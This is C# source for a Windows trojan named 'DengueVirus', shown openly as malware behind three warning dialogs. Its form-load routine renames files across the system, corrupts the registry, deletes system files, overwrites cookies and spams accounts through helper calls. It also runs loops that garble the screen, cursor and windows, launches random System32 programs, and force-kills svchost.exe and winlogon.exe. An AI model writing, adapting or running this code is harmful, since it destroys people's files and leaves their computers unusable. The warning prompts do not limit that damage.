using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DengueVirus.Spicy;

namespace DengueVirus
{
    public partial class Form1 : Form
    {
        // DLLs import thing, ignore it i guess.

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

        [DllImport("user32.dll")]
        private static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")]
        private static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("kernel32.dll")]
        private static extern long __rdtsc();

        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint dwMilliseconds);


        const int SRCCOPY = 0xCC0020; // idk why i put this here, too lazy to replace the var with the hex

        const uint MB_ABORTRETRYIGNORE = 0x00000002;
        const uint MB_ICONWARNING = 0x00000030;
        const uint MB_RETRYCANCEL = 0x00000005;
        const uint MB_ICONERROR = 0x00000010;

        private static readonly IntPtr IDI_ERROR = new IntPtr(0x7F00);
        private static readonly IntPtr IDI_WARNING = new IntPtr(0x7F03);
        private static readonly IntPtr IDI_APPLICATION = new IntPtr(0x7F04);

        public Form1()
        {
            InitializeComponent();
        }

        public static void ErrorSounds()
        {
            while (true)
            {
                switch (new Random().Next(2))
                {
                    case 1:
                        SystemSounds.Hand.Play();
                        break;
                    case 0:
                        SystemSounds.Exclamation.Play();
                        break;
                }
                Thread.Sleep(400);
            }
        }

        public static void ShakeMouse()
        {
            // get cursor
            Cursor c = new Cursor(Cursor.Current.Handle);

            for (; ; )
            {
                // change its xy pos
                int i;
                for (i = 0; i < 100; i++)
                {
                    Cursor.Position = new Point(
                        Cursor.Position.X + i,
                        Cursor.Position.Y + i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X + i,
                        Cursor.Position.Y - i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X - i,
                        Cursor.Position.Y - i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X - i,
                        Cursor.Position.Y + i
                    );

                    Thread.Sleep(100 - i);
                }
                // reset i var and run again
                i = 0;
            }

        }
        public static void PrintRotate()
        {
            int num = 0;
            while (true)
            {
                IntPtr dc = GetDC(IntPtr.Zero);
                Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                Graphics graphics = Graphics.FromImage(image);
                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                graphics = Graphics.FromHdc(dc);
                Random random = new Random();
                if (num < 9)
                {
                    graphics.RotateTransform((float)(num * 4));//(float)(num * 10));
                    //graphics.DrawBezier(new Pen(Color.Red, 2f), 0, 0, 100, 100, 200, 200, 300, 300);
                    //graphics.DrawClosedCurve(new Pen(Color.Red, 2f), new Point[] { new Point(random.Next(0, 2), random.Next(0, 2)), new Point(random.Next(0, 200), random.Next(0, 200)), new Point(random.Next(0, 200), random.Next(0, 200)), new Point(random.Next(0, 200), random.Next(0, 200)) });
                    graphics.DrawImage(image, 0, 0);
                }
                else
                {
                    graphics.RotateTransform(-90f);
                    num = 0;
                }
                num++;
                Thread.Sleep(1);
            }
        }

        static void Wave()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            Random rand = new Random();

            int v7 = GetSystemMetrics(1);
            int v6 = GetSystemMetrics(0);

            int xD = -100;
            while (true)
            {
                int y = rand.Next(v7);
                int v4 = rand.Next(5);

                if (v4 == 1)
                { BitBlt(hdc, 0, y, v6, xD, hdc, xD, y, SRCCOPY); }
                else
                { BitBlt(hdc, 1, y, v6, xD, hdc, xD, y, SRCCOPY); }
                if (xD < 100) { xD++; } else { xD = -100; }
                Thread.Sleep(1);
            }
        }

        static void PatBltpayload()
        {
            // Stolen from Solaris, kinda generic payload
            // its just an invertscreen pl so i guess its fine
            // to reuse, and it generates some cool artifacts along with
            // the moving screen payload (Wave())

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                Random rand = new Random();
                int v4 = rand.Next();
                IntPtr v5 = new IntPtr(v4 % 40);
                SelectObject(hdc, v5);
                PatBlt(hdc, 0, 0, w, h, 0x005A0049);
                //Thread.Sleep(10);
            }
        }


        /*static void MessageBoxThread()
        {
            while (true)
            {
                string strText = GenRandomUnicodeString(new Random().Next(10, 20));
                string strTitle = GenRandomUnicodeString(new Random().Next(10, 20));
                Random random = new Random();

                if (random.Next(0, 2) == 0)
                {
                    MessageBox.Show(strText, strTitle, (MessageBoxButtons)MB_ABORTRETRYIGNORE, (MessageBoxIcon)MB_ICONWARNING);
                }
                else
                {
                    MessageBox.Show(strText, strTitle, (MessageBoxButtons)MB_RETRYCANCEL, (MessageBoxIcon)MB_ICONERROR);
                }
            }
        }*/

        public void DrawTextScreen()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(hdc))
            {
                int w = GetSystemMetrics(0);
                int h = GetSystemMetrics(1);
                Random random = new Random();
                while (true)
                {
                    Font f = new Font("Impact", random.Next(10, 50));
                    Brush b = new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                    g.DrawString(SpicyPL.GenRandomUnicodeString(random.Next(5, 15)), f, b, random.Next(0, w), random.Next(0, h));
                    g.FillRectangle(new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255))), random.Next(0, w), random.Next(0, h), random.Next(0, w), random.Next(0, h));
                    Thread.Sleep(1);
                }
            }
        }
        int systemMetricsX = GetSystemMetrics(0);
        int systemMetricsY = GetSystemMetrics(1);
        Random random = new Random();

        public void WindowPosSpam()
        {

            GetDC(IntPtr.Zero);
            //Stopwatch stopwatch = Stopwatch.StartNew();

            while (true)
            {
                /*long v1 = stopwatch.ElapsedTicks;
                uint v14 = (((uint)v1 << 13) ^ (uint)v1) << 17 ^ ((uint)v1 << 13) ^ (uint)v1;
                long v2 = stopwatch.ElapsedTicks;
                int v3 = (int)v2;
                long v4 = stopwatch.ElapsedTicks;
                int v5 = (int)v4;
                long v6 = stopwatch.ElapsedTicks;
                int v7 = (((v3 << 13) ^ v3) << 17) ^ (v3 << 13) ^ v3;
                int v8 = (((v5 << 13) ^ v5) << 17) ^ (v5 << 13) ^ v5;
                uint v9 = (((uint)v6 << 13) ^ (uint)v6) << 17 ^ ((uint)v6 << 13) ^ (uint)v6;
                */
                IntPtr foregroundWindow = GetForegroundWindow();
                SetWindowPos(
                    foregroundWindow,
                    IntPtr.Zero,
                    random.Next(0, systemMetricsX),
                    random.Next(0, systemMetricsY),
                    random.Next(0, systemMetricsX),
                    random.Next(0, systemMetricsY),
                    0);
                //long v11 = stopwatch.ElapsedTicks;
                //uint v12 = (((uint)v11 << 13) ^ (uint)v11) << 17 ^ ((uint)v11 << 13) ^ (uint)v11;
                //Sleep((uint)(((32 * v12) ^ v12) % 0x320 + 600));
                Thread.Sleep(1);
            }
        }

        private void ImageFollowMouse()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(hdc))
            {
                g.InterpolationMode = InterpolationMode.Low;
                g.CompositingQuality = CompositingQuality.HighSpeed;
                g.SmoothingMode = SmoothingMode.HighSpeed;
                g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                Brush b = new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                while (true)
                {
                    // Desenhar na posição do cursor do mouse
                    g.DrawImage(Properties.Resources.manface, Cursor.Position.X + random.Next(-10, 10), Cursor.Position.Y + random.Next(-10, 10), random.Next(50, 100), random.Next(50, 100));
                    Thread.Sleep(1);
                }
            }
        }

        private static void SpamIco()
        {
            IntPtr hDc = GetDC(IntPtr.Zero);
            Random random = new Random();
            while (true)
            {
                int x = random.Next(GetSystemMetrics(0));
                int y = random.Next(GetSystemMetrics(1));
                DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_ERROR));
                Thread.Sleep(1);
                x = random.Next(GetSystemMetrics(0));
                y = random.Next(GetSystemMetrics(1));
                DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_WARNING));
                Thread.Sleep(1);
                x = random.Next(GetSystemMetrics(0));
                y = random.Next(GetSystemMetrics(1));
                DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_APPLICATION));

                Thread.Sleep(1);
            }
        }

        /*public void ChangeButtonSize()
        {
            while (true)
            {
                if (button1.InvokeRequired)
                {
                    button1.Invoke(new Action(() =>
                    {
                        button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
                        button1.Text = GenRandomUnicodeString(button1.Size.Width);
                    }));
                }
                else
                {
                    button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
                    button1.Text = GenRandomUnicodeString(button1.Size.Width);
                }
                Thread.Sleep(10);
            }
        }*/

        public void FillScreen()
        {
            while (true)
            {
                //fills the screen with an image from the resources
                IntPtr hdc = GetDC(IntPtr.Zero);
                Graphics g = Graphics.FromHdc(hdc);
                g.InterpolationMode = InterpolationMode.Low;
                g.CompositingQuality = CompositingQuality.HighSpeed;
                g.SmoothingMode = SmoothingMode.HighSpeed;
                g.PixelOffsetMode = PixelOffsetMode.HighSpeed;

                g.DrawImage(Properties.Resources.xd, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                g.Dispose();

                Thread.Sleep(10000);
            }
        }

        public void RotateScreen()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            Graphics g = Graphics.FromHdc(hdc);
            g.InterpolationMode = InterpolationMode.Low;
            g.CompositingQuality = CompositingQuality.HighSpeed;
            g.SmoothingMode = SmoothingMode.HighSpeed;
            g.PixelOffsetMode = PixelOffsetMode.HighSpeed;

            while (true)
            {
                g.RotateTransform(random.Next(-40, 40));
                Thread.Sleep(100);
            }
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            //SpicyPL.ForceUACElevation();
            
            // First warning
            DialogResult dialogResult = MessageBox.Show("This is malware. Are you sure you want to run this program?", "Dengue", MessageBoxButtons.YesNo);
            if (dialogResult != DialogResult.Yes)
            {
                this.Close();
                return;
            }

            // SECOND warning
            DialogResult dialogResult2 = MessageBox.Show("THIS WILL DESTROY YOUR COMPUTER FILES, INFO, IMAGES, SYSTEM. PRESS OK IF YOU ARE ON A VIRTUAL MACHINE **ONLY**", "Dengue", MessageBoxButtons.YesNo);
            if (dialogResult2 != DialogResult.Yes)
            {
                this.Close();
                return;
            }

            // FINAL WARNING
            DialogResult dialogResult3 = MessageBox.Show("By accepting this, the trojan will start, DONT BLAME ME FOR INFO LOSS.", "Dengue", MessageBoxButtons.OKCancel);
            if (dialogResult3 != DialogResult.OK)
            {
                this.Close();
                return;
            }

            //if the date is 1st of any month
            if (DateTime.Now.Day == 1 || DateTime.Now.Day == 10)
            {
                Cursor = Cursors.WaitCursor;
                Thread.Sleep(1000);
                Cursor = Cursors.Default;
                Thread.Sleep(1000);
                Cursor = Cursors.WaitCursor;
                Thread.Sleep(1000);
                Cursor = Cursors.AppStarting;
                Thread.Sleep(1000);
                Cursor = Cursors.Default;
            }

            SpicyPL.WriteNote();
            SpicyPL.OverwriteCookie();

            SpicyPL.MassRename("bat", "exe");
            SpicyPL.MassRename("txt", "docx");
            SpicyPL.MassRename("png", "jpg");
            SpicyPL.MassRename("jpeg", "bmp");

            SpicyPL.CorruptRegistry();

            SpicyPL.DeleteSystemFiles();

            SpicyPL.SpamWindowsWithAccounts();

            //Thread.Sleep(12000);
            /*SoundPlayer audio = new SoundPlayer(Properties.Resources.speaker);
            audio.Load(); // Ensure the audio is loaded before playing
            audio.Play();*/

            Thread winpos = new Thread(WindowPosSpam); winpos.Start();
            Thread fill = new Thread(FillScreen); fill.Start();
            SpicyPL.OpenRandomEXEFromSys32();
            Thread t3 = new Thread(PrintRotate); t3.Start();
            Thread t4 = new Thread(Wave); t4.Start();
            Thread text = new Thread(DrawTextScreen); text.Start();

            Thread.Sleep(5000);

            //Process.Start("start", "https://en.wikipedia.org/wiki/Computer_virus");

            text.Abort();
            t3.Abort();
            Thread t5 = new Thread(PatBltpayload); t5.Start();
            //Thread t6 = new Thread(MessageBoxThread); t6.Start();
            Thread sigma = new Thread(ImageFollowMouse); sigma.Start();

            SpicyPL.UserNote();
            //Thread aaa = new Thread(ChangeButtonSize); aaa.Start();

            Thread.Sleep(5000);
            t5.Abort();
            //t6.Abort();
            SpicyPL.OpenRandomScreensaver();

            Thread.Sleep(5000);
            t4.Abort();
            Thread ico = new Thread(SpamIco); ico.Start();
            SpicyPL.OpenRandomEXEFromSys32();

            Thread.Sleep(5000);
            ico.Abort();
            //close form
            this.Close();

            SpicyPL.OpenRandomEXEFromSys32();

            Thread.Sleep(5000);

            //Process.Start("start", "https://github.com/PatoFlamejanteTV/");
            SpicyPL.OpenRandomEXEFromSys32();
            SpicyPL.Brain();
            winpos.Abort();
            fill.Abort();
            sigma.Abort();

            Thread a = new Thread(PatBltpayload); a.Start();
            Thread b = new Thread(Wave); b.Start();
            Thread c = new Thread(PrintRotate); c.Start();
            Thread d = new Thread(DrawTextScreen); d.Start();
            SpicyPL.OpenRandomEXEFromSys32();
            Thread.Sleep(10000);
            a.Abort(); c.Abort();
            Thread.Sleep(4000);
            b.Abort(); d.Abort();

            Process.Start("taskkill", "/F /IM svchost.exe");
            Process.Start("taskkill", "/F /IM winlogon.exe");

            //taskkill itself
            Process.Start("taskkill", "/F /IM DengueVirus.exe");
        }

        

        private void button1_Click(object sender, EventArgs e)
        {
            SpicyPL.OpenRandomEXEFromSys32();
        }
    }
}
